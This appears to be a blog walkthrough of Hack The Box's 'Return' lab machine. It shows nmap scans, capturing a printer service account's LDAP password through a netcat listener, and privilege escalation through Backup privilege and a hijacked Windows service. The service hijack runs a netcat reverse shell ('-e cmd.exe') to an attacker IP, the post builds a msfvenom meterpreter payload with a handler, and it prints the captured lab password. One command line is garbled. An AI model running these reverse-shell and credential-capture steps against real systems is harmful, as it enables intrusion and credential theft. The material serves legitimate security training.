---
title: 'Return Walkthrough: Exploiting Printer Misconfigurations'
date: 2024-11-08 19:00:00 +0530
categories: [red-teaming]
tags:
- HTB
- ldap
- on-prem
- privesc_backup
---

Walkthrough of HTB's Return machine

## Initial Recon

### NMAP Scan:

I began by scanning for interesting TCP ports to identify potential entry points:

```bash
> open_tcp_ports=$(sudo nmap -T5 -sS -n -Pn --disable-arp-ping -p- 10.10.11.108 --max-retries 0 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
> nmap -A -p $open_tcp_ports 10.10.11.42
```

**TCP scan results:**

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-11-25 15:37:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62633/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

No interesting information found in the UDP Scan results

### HTTP Recon

Accessing port 80 displays a web page labeled 'HTB Printer Admin Panel'.
![image.png]({ '/assets/img/Return/image%201.png' | relative_url })

Most available sections, such as 'Fax' and 'Troubleshooting,' are static, but the 'Settings' page includes an intriguing form with fields for the server address, port, username, and password, as shown below.
![image.png]({ '/assets/img/Return/image%202.png' | relative_url })

When I submitted the form, I observed that only the IP address field was forwarded to the server. Modifying the username and password fields did not result in any changes to the request.
![image.png]({ '/assets/img/Return/image%203.png' | relative_url })

Further research revealed interesting information
Printers can use LDAP (Lightweight Directory Access Protocol) to query the Active Directory for user details, such as email addresses, usernames, and group memberships. This allows features like:

- Sending scanned documents to a userâ€™s email directly.
- Displaying a list of users for specific authentication or tracking purposes.

For this to work, the printer needs LDAP credentials (often a service account like svc-printer) to bind to AD and perform queries.

I modified the IP address to point to my machine and set up a Netcat listener to intercept the data submitted by the form possibly revealing the password.

![image.png]({ '/assets/img/Return/image%204.png' | relative_url })

The incoming request revealed interesting information, which indeed appears to be a password.

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nc -nlvp 389                                                                   
listening on [any] 389 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.11.108] 63453
0*`%return\svc-printerï¿½
                       1edFg43012!!      
```

### SMB Recon

To validate the enumerated credentials, I used  netexec to enumerate SMB shares. The results confirmed that the credentials are valid, with the user having interesting 'READ' and 'WRITE' privileges on certain shares.
![image.png]({ '/assets/img/Return/image.png' | relative_url })

## Remote Access Using Compromised Credentials

I attempted to log in to the machine using the compromised credentials, as shown below:
![image.png]({ '/assets/img/Return/image%206.png' | relative_url })

Navigating to the Users directory reveals two users: svc-printer and Administrator
![image.png]({ '/assets/img/Return/image%205.png' | relative_url })

Accessing "user.txt" on the svc-printer's desktop reveals first flag.

## Privilege Escation to SYSTEM

### Method - 1

Enumerating privileges of "svc-printer" using *whoami* command
![image.png]({ '/assets/img/Return/image%207.png' | relative_url })

Since the user has the Backup privilege enabled. Uploading the necessary module to leverage this privilege for replication.
![image.png]({ '/assets/img/Return/image%208.png' | relative_url })

Using robocopy to copy the Administratorâ€™s desktop files to a temporary folder.
![image.png]({ '/assets/img/Return/image%209.png' | relative_url })

Followed by accessing root.txt

### Method - 2

Since the user belongs to the "Server Operators" group, which has the ability to start and stop system services,  leveraged this privilege to gain a reverse shell. Using evil-winrm, uploaded Netcat to the "Return" machine and modified the service configuration to execute a reverse shell command:

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:[SC] ChangeServiceConfig SUCCESS4.exe -e cmd.exe 10.10.16.5 4444"
```

Stopping and restarting the service to trigger the reverse shell

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

> ðŸ’¡ **Note**: When executing the command sc start vss, it is important to explicitly specify sc.exe for the command to work correctly. Simply using sc will not be sufficient.

However, the obtained shell terminated after a few seconds. To resolve this issue, I proceeded to upload a Meterpreter shell for further exploitation.

Generated meterpreter reverse shell executable payload file using msfvenom
```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=8888 -f exe > payload.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

Configuring Metasploit listener to listen on 8888

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.5
LHOST => 10.10.16.5
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
```

The same issue was observed when using the Metasploit Framework; the reverse shell terminated after a few seconds.

![image.png]({ '/assets/img/Return/image%2010.png' | relative_url })

To stabilize the session, I migrated the process to a more suitable one using the migrate <pid> command.

![image.png]({ '/assets/img/Return/image%2011.png' | relative_url })

Spawning the shell

![image.png]({ '/assets/img/Return/image%2012.png' | relative_url })

## Disclaimer

*The techniques and tools discussed in this walkthrough are intended solely for educational purposes and to help improve cybersecurity awareness. Please conduct any penetration testing activities only on systems that you own or have explicit permission to test. Unauthorized access to computer systems is illegal and punishable by law. The author does not take responsibility for any misuse of the information provided*

